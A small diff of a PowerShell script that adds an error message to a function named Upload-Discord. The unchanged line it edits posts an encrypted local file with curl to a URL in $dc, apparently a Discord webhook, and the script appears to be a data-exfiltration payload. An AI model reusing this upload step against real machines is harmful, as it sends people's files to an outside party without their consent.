@@ -561,7 +561,9 @@ function Upload-Discord {
     # Send the encrypted file if it exists
     if (Test-Path $encryptedFilePath) {
         curl.exe -F "file1=@$encryptedFilePath" $dc
-    }
+    } else {
+    Write-Output "Error: Encrypted file not found at path: $encryptedFilePath"
+}
 }
 
  
